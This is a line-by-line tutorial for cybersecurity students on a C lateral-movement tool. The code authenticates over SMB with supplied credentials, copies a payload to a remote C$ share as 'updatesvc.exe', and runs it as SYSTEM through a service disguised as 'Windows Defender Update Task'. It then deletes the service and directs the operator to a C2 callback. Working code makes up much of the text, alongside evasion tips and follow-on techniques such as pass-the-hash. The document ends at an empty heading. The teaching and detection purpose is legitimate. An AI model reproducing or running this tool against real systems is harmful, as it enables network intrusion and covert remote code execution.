# Shadow Lateral Movement Tool — Complete Line-by-Line Documentation

> **Target Audience:** Cert IV Cyber Security students  
> **Context:** Red Team / Advanced Persistent Threat (APT) simulation  
> **Technique:** Lateral movement via SMB administrative shares and remote service creation  
> **ATT&CK Mapping:** T1021.002 (SMB/Windows Admin Shares), T1543.003 (Windows Service), T1570 (Lateral Tool Transfer)

---

## 1. Overview

This program, `NetExec.exe`, is a **lateral movement tool** that demonstrates how an attacker with valid credentials can:

1. **Authenticate** to a remote Windows machine over the network using SMB (Server Message Block).
2. **Copy a malicious payload** to the remote machine's `C$` administrative share.
3. **Create and start a Windows Service** on the remote machine to execute that payload.
4. **Clean up** by removing the service after execution.

The payload executes with **SYSTEM privileges** because the Service Control Manager (SCM) runs services under the `NT AUTHORITY\SYSTEM` account by default. This is a classic technique used in real-world attacks like PsExec (Sysinternals) and many APT frameworks.

> ⚠️ **Educational Purpose Only:** This code is provided for cyber security training, detection engineering, and defensive analysis. Understanding how attackers move laterally is essential for building effective defences.

---

## 2. Line-by-Line Breakdown

### 2.1 Header Includes and Library Pragmas

```c
#include <windows.h>
```
- **Line meaning:** Includes the main Windows API header file.
- **Concept:** `windows.h` is the gateway to virtually every Windows API function, data type, constant, and macro. It pulls in declarations for functions like `CopyFileA`, `OpenSCManagerA`, `CreateServiceA`, `WNetAddConnection2A`, and thousands of others.
- **Why it's needed:** Without this header, the compiler wouldn't know the signatures (parameters and return types) of any Windows API functions.

```c
#include <stdio.h>
```
- **Line meaning:** Includes the Standard Input/Output library.
- **Concept:** This is part of the C Standard Library. It provides `printf()` for printing text to the console, `scanf()` for reading input, `fprintf()` for writing to files, etc.
- **Why it's needed:** The program uses `printf()` extensively to display status messages (`[+]`, `[-]`, `[*]`) to the operator.

```c
#include <string.h>
```
- **Line meaning:** Includes string manipulation functions.
- **Concept:** Provides functions like `strcpy()`, `strcmp()`, `strlen()`, `memset()`, etc. In this code, it's included as standard practice, though most string operations here use `_snprintf()` (from the Microsoft C Runtime).
- **Why it's needed:** General string handling support. Modern secure coding prefers `strncpy_s` or `StringCchCopy`, but this code uses older C runtime conventions.

```c
#pragma comment(lib, "advapi32.lib")
```
- **Line meaning:** Tells the Microsoft Visual C++ linker to automatically link against `advapi32.lib`.
- **Concept:** `#pragma comment` is a Microsoft-specific compiler directive. The `lib` parameter instructs the linker to add this library to the link command automatically.
- **What is advapi32.dll:** The **Advanced Windows API** DLL. It contains functions for the registry, services, security, and account management — including `OpenSCManagerA`, `CreateServiceA`, `StartServiceA`, `DeleteService`, `OpenProcessToken`, `DuplicateTokenEx`, and more.
- **Why it's needed:** Without linking against the import library, the linker would produce "unresolved external symbol" errors for every SCM and security function used.

```c
#pragma comment(lib, "mpr.lib")
```
- **Line meaning:** Tells the linker to link against `mpr.lib`.
- **Concept:** Same pragma mechanism as above, but for the **Multiple Provider Router** library.
- **What is mpr.dll:** The MPR DLL handles network connections, including `WNetAddConnection2A` and `WNetCancelConnection2A` which are used to map and unmap network drives/shares with explicit credentials.
- **Why it's needed:** The `WNet*` functions for SMB authentication live in this library.

---

### 2.2 The `main()` Function — Entry Point

```c
int main(int argc, char* argv[])
```
- **Line meaning:** Declares the main entry point of the program.
- **Concept — `argc`:** **Arg**ument **C**ount. An integer representing how many command-line arguments were passed to the program. The program name itself counts as argument 0, so `argc` is always at least 1.
- **Concept — `argv`:** **Arg**ument **V**ector. An array of C strings (`char*`), where `argv[0]` is the program name, `argv[1]` is the first argument, etc.
- **Concept — `int` return:** In C, `main` returns an integer to the operating system. `0` typically means success; non-zero means an error occurred.
- **Why this signature:** This standard form allows the program to receive configuration (target IP, username, password, payload path) from the command line instead of hardcoding them.

---

### 2.3 Argument Validation

```c
    if (argc < 5) {
```
- **Line meaning:** Checks if fewer than 5 command-line arguments were provided.
- **Concept:** Since `argv[0]` is the program name, we need `argv[1]` through `argv[4]` (4 additional arguments). Therefore, `argc` must be at least 5.
- **Logic breakdown:**
  - `argc == 1` → only program name, no arguments
  - `argc == 5` → program + 4 arguments (minimum required)
  - `argc < 5` → missing one or more required arguments

```c
        printf("Usage: NetExec.exe <target_ip> <username> <password> <local_payload_path>\n");
```
- **Line meaning:** Prints a usage instruction showing the correct syntax.
- **Concept:** `\n` is the newline escape sequence in C. This tells the user exactly how to invoke the tool.

```c
        printf("Example: NetExec.exe 192.168.1.50 Administrator P@ssw0rd C:\\staging\\spoolsv.exe\n");
```
- **Line meaning:** Provides a concrete example.
- **Concept — double backslashes `\\`:** In C string literals, `\` is the escape character. To represent a literal backslash in the output, you must escape it as `\\`. A single `\` would be interpreted as an escape sequence (e.g., `\n` = newline, `\t` = tab).

```c
        return 1;
```
- **Line meaning:** Exits the program with return code 1 (error).
- **Concept:** Returning non-zero from `main` signals to the calling process (shell, script, etc.) that something went wrong. Conventionally, `1` is a generic error code.

---

### 2.4 Argument Assignment

```c
    char* target      = argv[1];
```
- **Line meaning:** Creates a pointer named `target` and assigns it the value of `argv[1]`.
- **Concept — `char*`:** A pointer to a character. In C, strings are represented as pointers to the first character of a contiguous sequence of characters terminated by a null byte (`\0`).
- **Concept — pointer assignment:** `target` doesn't copy the string; it simply stores the memory address where `argv[1]` begins. Both `target` and `argv[1]` point to the same memory.
- **What it stores:** The target IP address or hostname (e.g., `"192.168.1.50"`).

```c
    char* user        = argv[2];
```
- **Line meaning:** Assigns `argv[2]` (the username) to the `user` pointer.
- **Example value:** `"Administrator"`

```c
    char* pass        = argv[3];
```
- **Line meaning:** Assigns `argv[3]` (the password) to the `pass` pointer.
- **Example value:** `"P@ssw0rd"`

```c
    char* localPath   = argv[4];
```
- **Line meaning:** Assigns `argv[4]` (local payload path) to `localPath`.
- **Example value:** `"C:\\staging\\spoolsv.exe"`

---

### 2.5 Buffer Declaration

```c
    char ipc[MAX_PATH];
```
- **Line meaning:** Declares a character array (string buffer) named `ipc` with a size of `MAX_PATH` bytes.
- **Concept — `MAX_PATH`:** A Windows constant defined in `windows.h` with the value `260`. This is the maximum length (in characters) of a path in many Windows APIs.
- **Concept — stack allocation:** This buffer is allocated on the **stack** — fast, automatic memory that exists only for the duration of this function call.
- **Purpose:** Will hold the UNC path to the `IPC$` share (e.g., `\\192.168.1.50\IPC$`).

```c
    char remotePath[MAX_PATH];
```
- **Line meaning:** Declares another `MAX_PATH`-sized buffer for the remote file path.
- **Purpose:** Will hold the UNC path where the payload will be copied (e.g., `\\192.168.1.50\C$\Windows\Temp\updatesvc.exe`).

```c
    char scmName[MAX_PATH];
```
- **Line meaning:** Declares a buffer for the Service Control Manager machine name.
- **Purpose:** Will hold the target machine identifier for SCM operations (e.g., `\\192.168.1.50`).

---

### 2.6 String Formatting with `_snprintf`

```c
    _snprintf(ipc, MAX_PATH, "\\\\%s\\IPC$", target);
```
- **Line meaning:** Formats a string and writes it into the `ipc` buffer, with a maximum length protection.
- **Concept — `_snprintf`:** The Microsoft-specific "secure-ish" version of `sprintf`. It writes formatted output to a buffer with a maximum size limit to prevent buffer overflows.
  - Parameter 1: destination buffer (`ipc`)
  - Parameter 2: maximum bytes to write (`MAX_PATH`)
  - Parameter 3: format string
  - Parameter 4+: values to substitute into format specifiers
- **Concept — format specifier `%s`:** Tells the function to substitute a C string at this position.
- **Concept — `\\\\` in the format string:** Four backslashes in the C source code become two literal backslashes in the output (each `\\` pair → one `\`). Then the actual UNC path needs `\` before the machine name. Wait — let's trace carefully:
  - `"\\\\"` in source → `"\\"` in memory (each `\\` escapes to `\`, so `\\\\` = two `\` pairs = two literal backslashes).
  - Actually: `"\\\\%s\\IPC$"` → `"\\"` + target + `"\IPC$"` = `\\192.168.1.50\IPC$`.
- **Result example:** `\\192.168.1.50\IPC$`
- **Why IPC$:** The `IPC$` (Inter-Process Communication) share is a hidden administrative share used for named pipe communication. It's the standard target for establishing an authenticated SMB session before performing other operations.

```c
    _snprintf(remotePath, MAX_PATH, "\\\\%s\\C$\\Windows\\Temp\\updatesvc.exe", target);
```
- **Line meaning:** Formats the remote destination path for the payload.
- **Concept — `C$`:** The hidden administrative share that exposes the entire `C:` drive of a Windows machine. Only administrators can access it by default.
- **Concept — path traversal:** `C$\Windows\Temp\updatesvc.exe` refers to `C:\Windows\Temp\updatesvc.exe` on the remote machine.
- **Why `updatesvc.exe`:** Masquerades as a legitimate Windows Update service executable. This is **binary impersonation** — giving the malware a name that blends in with normal system processes.
- **Result example:** `\\192.168.1.50\C$\Windows\Temp\updatesvc.exe`

```c
    _snprintf(scmName, MAX_PATH, "\\\\%s", target);
```
- **Line meaning:** Formats the SCM connection string.
- **Result example:** `\\192.168.1.50`
- **Why this format:** The `OpenSCManagerA` function expects a machine name in UNC format (with leading `\\`) or `NULL` for the local machine.

---

### 2.7 Network Resource Authentication — `WNetAddConnection2A`

```c
    /* 1. Authenticate to target IPC$ */
```
- **Comment:** Marks the beginning of Step 1 — establishing authenticated network access.

```c
    NETRESOURCEA nr = {0};
```
- **Line meaning:** Declares a variable `nr` of type `NETRESOURCEA` and initialises all its members to zero.
- **Concept — `NETRESOURCEA`:** A Windows structure defined in `winnetwk.h` (included via `windows.h`) that describes a network resource. The `A` suffix indicates the ANSI/ASCII version (as opposed to `NETRESOURCEW` which uses wide/Unicode characters).
- **Concept — `{0}`:** In C, this is a designated initialiser that sets the first member to 0, and all remaining members are implicitly zero-initialised. This is a defensive programming pattern — ensures no garbage values exist in unused fields.
- **Fields of `NETRESOURCEA`:**
  - `dwScope` — resource scope (ignored here)
  - `dwType` — type of resource (disk, print, etc.)
  - `dwDisplayType` — how to display the resource
  - `dwUsage` — how the resource can be used
  - `lpLocalName` — name of local device (NULL = no local mapping)
  - `lpRemoteName` — UNC path to remote resource
  - `lpComment` — comment string
  - `lpProvider` — network provider name

```c
    nr.lpRemoteName = ipc;
```
- **Line meaning:** Sets the `lpRemoteName` member to point to our `ipc` string (`\\target\IPC$`).
- **Concept — `lp` prefix:** Hungarian notation in Windows API. `lp` = **L**ong **P**ointer (historical from 16-bit Windows). It means "pointer to something."
- **Why `IPC$` specifically:** We authenticate to `IPC$` first to establish a session. Once authenticated, we can access other shares like `C$` using the same session credentials.

```c
    nr.dwType       = RESOURCETYPE_ANY;
```
- **Line meaning:** Sets the resource type to "any" type.
- **Concept — `dw` prefix:** Hungarian notation. `dw` = **D**ouble **W**ord (32-bit unsigned integer).
- **Concept — `RESOURCETYPE_ANY`:** A constant (value `0`) telling Windows we don't care about the specific resource type. Other options include `RESOURCETYPE_DISK` and `RESOURCETYPE_PRINT`.

```c
    DWORD result = WNetAddConnection2A(&nr, pass, user, 0);
```
- **Line meaning:** Calls the Windows function to establish a network connection with explicit credentials.
- **Concept — `DWORD`:** A Windows data type — an unsigned 32-bit integer (`unsigned long`). Used extensively in Windows APIs for counts, sizes, error codes, and flags.
- **Function signature:** `DWORD WNetAddConnection2A(LPNETRESOURCEA lpNetResource, LPCSTR lpPassword, LPCSTR lpUserName, DWORD dwFlags);`
- **Parameter breakdown:**
  1. `&nr` — address of our `NETRESOURCEA` structure. The `&` operator gets the memory address of a variable.
  2. `pass` — the password string (from command line).
  3. `user` — the username string (from command line).
  4. `0` — no special flags.
- **What it does:** Attempts to authenticate to `\\target\IPC$` using the provided username and password. This creates an SMB session with those credentials.
- **Return value:** Returns `NO_ERROR` (defined as `0`) on success, or a Windows error code on failure.

```c
    if (result != NO_ERROR && result != ERROR_SESSION_CREDENTIAL_CONFLICT) {
```
- **Line meaning:** Checks if the connection attempt failed for a reason other than "credentials already in use."
- **Concept — `NO_ERROR`:** Windows constant equal to `0`, meaning success.
- **Concept — `ERROR_SESSION_CREDENTIAL_CONFLICT`:** A specific Windows error code (`1219`) that means you already have a connection to that server using different credentials. This commonly happens if you've already mapped a drive or connected to that machine in the same logon session.
- **Logic:** The `&&` (logical AND) means BOTH conditions must be true for the failure block to execute:
  - It's NOT `NO_ERROR` (something went wrong)
  - AND it's NOT a credential conflict (a different, unexpected error)
- **Why allow credential conflicts:** If we already have a connection to the target with valid credentials, we can proceed. The existing session may be sufficient.

```c
        printf("[-] Authentication failed: %lu\n", result);
```
- **Line meaning:** Prints an error message with the numeric error code.
- **Concept — `%lu` format specifier:** Unsigned long integer. Since `DWORD` is an unsigned 32-bit value, `%lu` is the appropriate format specifier.
- **Concept — `[-]` prefix:** Standard red team/penetration testing notation for a failure or negative result.

```c
        return 1;
```
- **Line meaning:** Exits the program with error code 1.

```c
    printf("[+] Authenticated to %s as %s\n", target, user);
```
- **Line meaning:** Prints a success message.
- **Concept — `[+]` prefix:** Standard notation for success or a positive finding in penetration testing.

---

### 2.8 Payload Staging — `CopyFileA`

```c
    /* 2. Copy payload to target ADMIN$ equivalent (C$) */
```
- **Comment:** Marks Step 2 — transferring the malicious file to the target.

```c
    if (!CopyFileA(localPath, remotePath, FALSE)) {
```
- **Line meaning:** Attempts to copy the local payload file to the remote path via `C$`, and checks if it failed.
- **Function signature:** `BOOL CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);`
- **Parameter breakdown:**
  1. `localPath` — source file on the attacker's/local machine.
  2. `remotePath` — destination UNC path on the target (`\\target\C$\Windows\Temp\updatesvc.exe`).
  3. `FALSE` — if the destination file already exists, overwrite it. (`TRUE` would cause the function to fail if the file exists.)
- **Concept — `BOOL`:** Windows boolean type. `TRUE` = non-zero (typically 1), `FALSE` = 0.
- **Concept — `!` operator:** Logical NOT. `CopyFileA` returns non-zero (`TRUE`) on success, so `!TRUE` = `FALSE`, and the error block is skipped. If `CopyFileA` returns `0` (`FALSE`, failure), then `!FALSE` = `TRUE`, and we enter the error block.
- **How it works over the network:** Because we already authenticated via `WNetAddConnection2A`, the SMB session is active. `CopyFileA` uses standard Windows I/O APIs under the hood, which automatically use the established SMB session for UNC paths.

```c
        printf("[-] Payload copy failed: %lu\n", GetLastError());
```
- **Line meaning:** Prints the specific Windows error code that caused the copy to fail.
- **Concept — `GetLastError()`:** A crucial Windows function that returns the error code from the last failed system call in the current thread. Each thread maintains its own "last error" value. Common causes here:
  - `ERROR_ACCESS_DENIED` (5) — bad credentials or insufficient privileges
  - `ERROR_BAD_NETPATH` (53) — `C$` share doesn't exist or is blocked
  - `ERROR_FILE_NOT_FOUND` (2) — local payload doesn't exist

```c
        WNetCancelConnection2A(ipc, 0, TRUE);
```
- **Line meaning:** Closes the network connection before exiting.
- **Function signature:** `DWORD WNetCancelConnection2A(LPCSTR lpName, DWORD dwFlags, BOOL fForce);`
- **Parameters:**
  - `ipc` — the connection to cancel (`\\target\IPC$`)
  - `0` — no special flags
  - `TRUE` — forcefully disconnect even if files are open
- **Why cleanup matters:** Leaving network connections open creates artifacts in the target's event logs and session tables. It also consumes resources.

```c
        return 1;
```
- **Line meaning:** Exit with error.

```c
    printf("[+] Payload staged at %s\n", remotePath);
```
- **Line meaning:** Confirms successful file transfer.
- **Terminology — "staged":** In offensive operations, "staging" means placing a payload on target in preparation for execution. The payload sits on disk until triggered.

---

### 2.9 Opening the Service Control Manager — `OpenSCManagerA`

```c
    /* 3. Open SCM on remote machine */
```
- **Comment:** Marks Step 3 — connecting to the remote Service Control Manager.

```c
    SC_HANDLE hScm = OpenSCManagerA(scmName, NULL, SC_MANAGER_CREATE_SERVICE);
```
- **Line meaning:** Opens a handle to the Service Control Manager database on the remote machine.
- **Concept — `SC_HANDLE`:** A Windows handle type specifically for service manager objects. A handle is an opaque reference (typically a `void*` or integer) that the operating system uses to identify an open resource.
- **Function signature:** `SC_HANDLE OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);`
- **Parameter breakdown:**
  1. `scmName` — `\\target`, the remote machine name in UNC format.
  2. `NULL` — use the default service database (`ServicesActive`).
  3. `SC_MANAGER_CREATE_SERVICE` — requested access right. We need permission to create a new service.
- **Concept — access rights:** Windows uses **access control** on every securable object. `SC_MANAGER_CREATE_SERVICE` is a specific permission flag that grants the right to call `CreateService`. The actual check happens on the remote machine — our account must have administrative privileges there.
- **What happens under the hood:** Windows opens an RPC (Remote Procedure Call) connection to the remote SCM service (`svcctl` interface). The credentials from our SMB session are used for authentication.

```c
    if (!hScm) {
```
- **Line meaning:** Checks if `OpenSCManagerA` failed.
- **Concept — NULL handle:** Windows APIs typically return `NULL` (0) on failure for handle-creating functions.

```c
        printf("[-] OpenSCManager failed: %lu\n", GetLastError());
```
- **Common errors:**
  - `ERROR_ACCESS_DENIED` (5) — not an admin on the target
  - `RPC_S_SERVER_UNAVAILABLE` (1722) — target isn't reachable or SCM service is disabled
  - `ERROR_INVALID_HANDLE` — malformed machine name

```c
        WNetCancelConnection2A(ipc, 0, TRUE);
```
- **Line meaning:** Cleans up the network connection.

```c
        return 1;
```
- **Line meaning:** Exit with error.

---

### 2.10 Creating the Remote Service — `CreateServiceA`

```c
    /* 4. Create remote service */
```
- **Comment:** Marks Step 4 — creating the malicious service that will execute our payload.

```c
    SC_HANDLE hSvc = CreateServiceA(
```
- **Line meaning:** Begins the call to create a new Windows service on the remote machine.
- **Concept — Windows Service:** A program that runs in the background, managed by the Service Control Manager. Services run in their own session (Session 0) and typically execute as `SYSTEM`.
- **Why services for lateral movement:** Services are the standard way to execute code remotely with SYSTEM privileges on Windows. The SCM runs as SYSTEM, and any service it starts inherits this highly privileged security context.

```c
        hScm,
```
- **Parameter 1:** Handle to the Service Control Manager (returned by `OpenSCManagerA`).

```c
        "WinDefendUpdate",               /* service name  */
```
- **Parameter 2:** The internal service name (registry key name).
- **Concept — service name vs display name:** The service name is a short, unique identifier used in the registry (`HKLM\SYSTEM\CurrentControlSet\Services\WinDefendUpdate`) and in API calls. It cannot contain spaces or special characters in many contexts.
- **Why "WinDefendUpdate":** Masquerades as a legitimate Windows Defender component. This is **deceptive naming** — an analyst scrolling through services might overlook it.

```c
        "Windows Defender Update Task",  /* display name  */
```
- **Parameter 3:** The human-readable display name shown in `services.msc`.
- **Why this display name:** Further reinforces the masquerade. "Windows Defender Update Task" sounds like a legitimate scheduled maintenance operation.

```c
        SERVICE_START | DELETE,
```
- **Parameter 4:** The requested access rights for the returned service handle.
- **Concept — bitwise OR (`|`):** Combines permission flags into a single value. `SERVICE_START` grants the right to start the service. `DELETE` grants the right to delete the service.
- **Why these permissions:** We need to start the service (to execute the payload) and delete it (to clean up afterwards).

```c
        SERVICE_WIN32_OWN_PROCESS,
```
- **Parameter 5:** The service type.
- **Concept — `SERVICE_WIN32_OWN_PROCESS`:** A constant (value `0x10`) indicating this service runs in its own process. The alternative is `SERVICE_WIN32_SHARE_PROCESS` where multiple services share a single `svchost.exe` process.
- **Why own process:** Simplicity. Our payload runs standalone, making it easier to manage and less likely to crash other services.

```c
        SERVICE_DEMAND_START,
```
- **Parameter 6:** The start type.
- **Concept — `SERVICE_DEMAND_START`:** The service does NOT start automatically at boot. It only runs when explicitly started via `StartService` or the Services GUI.
- **Why demand start:** We want to trigger execution immediately, not wait for a reboot. It also reduces persistence artifacts (though the service registry key remains until deleted).

```c
        SERVICE_ERROR_IGNORE,
```
- **Parameter 7:** The error control level.
- **Concept — `SERVICE_ERROR_IGNORE`:** If the service fails to start, the SCM logs the error but does NOT notify the user or take corrective action.
- **Why ignore errors:** Prevents Windows Error Reporting dialogs or critical service failure notifications that might alert a user or admin.

```c
        "C:\\Windows\\Temp\\updatesvc.exe",
```
- **Parameter 8:** The **binary path name** — the full path to the executable that runs when the service starts.
- **Concept — double backslashes again:** Four backslashes in the C source become two in the string literal, which becomes the actual path `C:\Windows\Temp\updatesvc.exe`.
- **Why this path:** This is where we copied the payload in Step 2. When the service starts, Windows executes this file.

```c
        NULL, NULL, NULL, NULL, NULL
```
- **Parameters 9–13:** All set to `NULL` because we don't need them:
  - `lpLoadOrderGroup` — service group for load ordering
  - `lpdwTagId` — receives the tag ID within the group
  - `lpDependencies` — array of service names this service depends on
  - `lpServiceStartName` — account to run as (`NULL` = `LocalSystem`)
  - `lpPassword` — password for the start account
- **Concept — `LocalSystem`:** The `NULL` for `lpServiceStartName` is critical. It means the service runs as `NT AUTHORITY\SYSTEM` — the highest privilege level on a local Windows machine.

```c
    );
```
- Closes the function call.

---

### 2.11 Handling Service Already Exists

```c
    if (!hSvc) {
```
- **Line meaning:** Checks if `CreateServiceA` failed.

```c
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
```
- **Line meaning:** Checks if the failure reason was that a service with this name already exists.
- **Concept — `ERROR_SERVICE_EXISTS`:** Windows error code `1073`.
- **Why handle this:** If the tool was run previously and didn't clean up, or if the service name genuinely collides with something, we can try to reuse the existing service entry.

```c
            hSvc = OpenServiceA(hScm, "WinDefendUpdate", SERVICE_START | DELETE);
```
- **Line meaning:** Opens a handle to the existing service.
- **Function:** `OpenServiceA` retrieves a handle to an existing service by name, with the requested access rights.

```c
            if (!hSvc) {
```
- **Line meaning:** Checks if opening the existing service also failed.

```c
                printf("[-] OpenService failed: %lu\n", GetLastError());
```
- **Line meaning:** Reports the error.

```c
                CloseServiceHandle(hScm);
```
- **Line meaning:** Closes the SCM handle.
- **Concept — resource cleanup:** Every `Open*` call should have a matching `Close*` call to prevent handle leaks.

```c
                WNetCancelConnection2A(ipc, 0, TRUE);
```
- **Line meaning:** Disconnects from the network share.

```c
                return 1;
```
- **Line meaning:** Exit with error.

```c
        } else {
```
- **Line meaning:** The error was something OTHER than "service already exists."

```c
            printf("[-] CreateService failed: %lu\n", GetLastError());
```
- **Common errors:**
  - `ERROR_ACCESS_DENIED` — insufficient privileges
  - `ERROR_INVALID_NAME` — bad service name format
  - `ERROR_PATH_NOT_FOUND` — the binary path doesn't exist on the remote machine

```c
            CloseServiceHandle(hScm);
```
- **Line meaning:** Closes the SCM handle.

```c
            WNetCancelConnection2A(ipc, 0, TRUE);
```
- **Line meaning:** Disconnects from the network share.

```c
            return 1;
```
- **Line meaning:** Exit with error.

---

### 2.12 Starting the Service — `StartServiceA`

```c
    /* 5. Start service — executes payload as SYSTEM on target */
```
- **Comment:** Marks Step 5 — the actual execution trigger.

```c
    if (StartServiceA(hSvc, 0, NULL)) {
```
- **Line meaning:** Starts the service and checks if it succeeded.
- **Function signature:** `BOOL StartServiceA(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR* lpServiceArgVectors);`
- **Parameter breakdown:**
  1. `hSvc` — handle to the service to start
  2. `0` — number of arguments to pass to the service's main function
  3. `NULL` — no argument strings
- **What happens:** The SCM creates a new process running `C:\Windows\Temp\updatesvc.exe` in the security context of `NT AUTHORITY\SYSTEM`.
- **Why this is powerful:** Even if the attacker only has standard administrative credentials, the payload executes as SYSTEM — higher than any local admin account. This is because the SCM itself runs as SYSTEM.

```c
        printf("[+] Service started on %s — payload executing as SYSTEM\n", target);
```
- **Line meaning:** Confirms successful execution.

```c
    } else {
```
- **Line meaning:** The start attempt failed.

```c
        printf("[-] StartService failed: %lu\n", GetLastError());
```
- **Common errors:**
  - `ERROR_SERVICE_ALREADY_RUNNING` (1056) — service is already running
  - `ERROR_PATH_NOT_FOUND` — binary was deleted or never copied correctly
  - Various errors from the launched process itself (though these often appear as service-specific error codes)

---

### 2.13 Cleanup

```c
    /* 6. Cleanup — remove service痕迹 */
```
- **Comment:** Marks Step 6 — removing evidence. (Note: `痕迹` is Chinese for "traces/tracks" — a comment artifact from the original code author.)

```c
    Sleep(2000);
```
- **Line meaning:** Pauses execution for 2000 milliseconds (2 seconds).
- **Function:** `Sleep(DWORD dwMilliseconds)` — yields the CPU and suspends the thread.
- **Why wait:** Gives the payload a moment to fully initialise and execute before we delete the service. If we delete too quickly, the SCM might terminate the process before it can establish a callback (e.g., reverse shell to C2).

```c
    DeleteService(hSvc);
```
- **Line meaning:** Removes the service entry from the SCM database.
- **What it does:** Deletes the registry key `HKLM\SYSTEM\CurrentControlSet\Services\WinDefendUpdate`.
- **Important caveat:** `DeleteService` marks the service for deletion. If the service is still running, the deletion is deferred until the service stops. Our payload is likely still running, so the service entry may persist until the process exits or the machine reboots.

```c
    CloseServiceHandle(hSvc);
```
- **Line meaning:** Closes the service handle.

```c
    CloseServiceHandle(hScm);
```
- **Line meaning:** Closes the SCM handle.

```c
    WNetCancelConnection2A(ipc, 0, TRUE);
```
- **Line meaning:** Disconnects the network session.

```c
    printf("[*] NetExec complete. Check C2 listener for callback from %s\n", target);
```
- **Line meaning:** Prints completion message.
- **Concept — `[*]` prefix:** Standard notation for informational/status messages.
- **Concept — C2:** **C**ommand and **C**ontrol. The attacker-controlled server that the payload connects back to. "Check C2 listener" implies the payload is a reverse shell or beacon.

```c
    return 0;
```
- **Line meaning:** Exits the program successfully.

```c
}
```
- **Line meaning:** Closes the `main` function.

---

## 3. Key Concepts

### 3.1 Windows Administrative Shares

Windows automatically creates hidden administrative shares on every drive:
- `C$` — root of the C: drive
- `D$` — root of the D: drive (if exists)
- `ADMIN$` — points to `%SystemRoot%` (usually `C:\Windows`)
- `IPC$` — used for remote IPC and named pipes

These shares are accessible only to members of the **Administrators** group. They are the foundation of remote Windows administration tools. Attackers abuse them for:
- File transfer (copying payloads)
- Remote registry access
- Service creation (via named pipes over SMB)

### 3.2 The Service Control Manager (SCM)

The SCM (`services.exe`) is the central component of Windows service management:
- Runs as `NT AUTHORITY\SYSTEM` at all times
- Listens on RPC endpoint `\PIPE\svcctl` for remote management requests
- Maintains the service database in the registry
- When a service is started, the SCM spawns the process under its own security context (SYSTEM)

This is why **any user who can create services on a remote machine effectively has SYSTEM-level remote code execution**.

### 3.3 SMB (Server Message Block) and NTLM Authentication

SMB is the protocol used for file sharing, printer sharing, and IPC on Windows networks:
- SMB operates over TCP port 445
- Authentication uses NTLM (NT LAN Manager) or Kerberos
- `WNetAddConnection2A` triggers an SMB session setup with NTLM authentication
- Once authenticated, the connection persists for that logon session

### 3.4 C Pointers and Strings

A C string is NOT an object — it's a sequence of bytes ending in `\0`:
```c
char* str = "Hello";  // str points to 'H' in memory. Bytes are: H,e,l,l,o,\0
```

Pointer assignment (`char* target = argv[1]`) only copies the address, not the data. Both variables reference the same memory.

### 3.5 Handles in Windows

A **handle** is an abstract reference to a system resource:
- `SC_HANDLE` — service or SCM database
- `HANDLE` — process, thread, file, registry key, etc.
- Handles must be closed with the appropriate function (`CloseHandle`, `CloseServiceHandle`) to free kernel resources.
- Failing to close handles causes resource leaks and creates forensic artifacts.

### 3.6 Hungarian Notation

Many Windows APIs use Hungarian notation prefixes:
- `lp` — Long Pointer
- `dw` — Double Word (32-bit unsigned)
- `h` — Handle
- `sz` — Zero-terminated String
- `b` / `f` — Boolean / Flag

---

## 4. Why This Technique Works (Red Team Perspective)

### 4.1 Privilege Escalation Through Architecture

The attacker doesn't need to exploit a vulnerability. They simply use legitimate Windows administrative features:
1. Administrative shares (`C$`) exist by design for remote management
2. The SCM exists by design for remote service management
3. Services run as SYSTEM by design

The "exploit" is abusing the **intended functionality** with stolen/compromised credentials.

### 4.2 Native Tooling Mimicry

This technique is nearly identical to how **PsExec** (a legitimate Microsoft Sysinternals tool) works. PsExec also:
- Authenticates to `ADMIN$`
- Copies a service executable (`PSEXESVC.exe`) to `ADMIN$\System32`
- Creates and starts a service
- Cleans up afterwards

Because PsExec is a trusted tool, this traffic pattern can blend in with legitimate administrative activity — making detection challenging.

### 4.3 Credential Dependency

The entire chain depends on having **valid credentials** for an administrative account on the target. This is why credential theft (from LSASS, SAM, Kerberoasting, etc.) is such a critical phase in the attack chain. Once an attacker has admin creds, lateral movement is largely a solved problem on unhardened networks.

### 4.4 No Exploit Required

Unlike buffer overflow or privilege escalation exploits, this technique:
- Works on fully patched systems
- Is extremely reliable (no memory corruption)
- Leaves minimal crash artifacts
- Can be scripted and automated easily

---

## 4.5 Real-World Priming

### The Lab Lie

**What the lab lets you believe:** Authenticating over SMB and creating a remote service is a reliable way to move laterally with only valid credentials.

**What the lab hides from you:** LAPS (Local Administrator Password Solution) ensures every workstation has a **unique** local admin password — no password reuse across machines. Windows Firewall blocks SMB (445) between workstations by default. Network segmentation (VLANs) isolates departments. EDR correlates SMB auth + service creation + immediate execution as a single high-severity incident. Service creation on a remote machine generates Event ID 7045 on the **target** — visible to the target's blue team.

### How It Dies in Production

| Defense | How It Kills This Technique | Your Lab Bypass |
|---------|---------------------------|-----------------|
| LAPS | Unique local admin password per machine; no credential reuse | Not deployed in lab |
| Windows Firewall | Blocks SMB (445) between workstations by default | Flat network, no firewall rules |
| Network segmentation | VLANs isolate workstations; no route to target | Flat classroom LAN |
| EDR lateral movement rules | Correlates SMB + service creation + execution | No EDR in lab |
| SMB signing required | Enforces signing; your tool does not support it | Not enforced |
| Event ID 7045 on target | Target machine logs the remote service creation | No SIEM on target |

### What a Professional Red Teamer Would Do

**Instead of SMB + remote service creation, they would:**
- **Pass-the-hash** — use NTLM hash directly without knowing plaintext password; works even with LAPS if you have the hash
- **WMI / PowerShell remoting** — `Invoke-Command` over WinRM; less noisy than service creation, no Event ID 7045
- **RDP hijacking** — steal existing RDP sessions instead of creating new ones; no new logon events
- **Kerberos delegation abuse** — exploit constrained/unconstrained delegation to move laterally without credentials

**Key difference:** The pro avoids creating new OS objects on the target. Every remote service, every new logon session, every copied file is a detection point. The pro reuses existing sessions and legitimate protocols.

### What to Learn Next

| Concept | Why It Matters | Where to Start |
|---------|---------------|----------------|
| Pass-the-hash | No plaintext password needed; works with LAPS | Impacket: `psexec.py` with `-hashes` |
| WMI remoting | No service creation = no Event ID 7045 | PowerShell: `Invoke-WmiMethod` |
| RDP session hijacking | No new logon = no Event ID 4624 | `tscon.exe` abuse |
| Kerberos delegation | Lateral movement without credentials | Harmj0y: "Delegating Like a Boss" |

### The Honest Bottom Line

